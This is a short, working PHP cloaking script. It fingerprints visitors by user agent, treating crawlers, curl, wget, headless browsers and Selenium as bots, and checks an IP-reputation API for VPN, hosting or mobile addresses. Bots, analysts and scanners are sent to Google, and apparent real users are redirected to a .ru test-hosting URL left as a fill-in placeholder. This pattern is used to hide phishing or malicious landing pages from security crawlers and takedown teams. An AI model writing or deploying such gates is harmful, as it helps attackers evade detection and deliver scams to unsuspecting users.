<?php
session_start();

function isBot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    $bot_patterns = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'sogou', 'facebookexternalhit', 'twitterbot',
        'linkedinbot', 'whatsapp', 'telegrambot', 'applebot',
        'crawler', 'spider', 'bot', 'scraper', 'curl', 'wget',
        'python', 'java', 'go-http-client', 'okhttp', 'axios',
        'postman', 'insomnia', 'rest-client', 'httpclient',
        'headlesschrome', 'phantomjs', 'selenium', 'webdriver'
    ];

    foreach ($bot_patterns as $pattern) {
        if (strpos($user_agent, $pattern) !== false) {
            return true;
        }
    }

    return empty($user_agent) || strlen($user_agent) < 10;
}

function isVPN($ip) {
    $api = "http://ip-api.com/json/$ip?fields=proxy,hosting,mobile,status";
    $response = @file_get_contents($api);
    if ($response === false) return true;

    $data = json_decode($response, true);
    if ($data['status'] !== 'success') return true;

    return ($data['proxy'] === true || $data['hosting'] === true || $data['mobile'] === true);
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$is_bot = isBot();
$is_vpn = isVPN($ip);

// ✅ If bot or VPN, redirect to Google
if ($is_bot || $is_vpn) {
    header("Location: https://www.google.com");
    exit();
}

// ✅ If real IP + human, redirect to YOUR WEBSITE
header("Location: http://srv237431.hoster-test.ru/rural");  // << Replace with your real site
exit();
?>
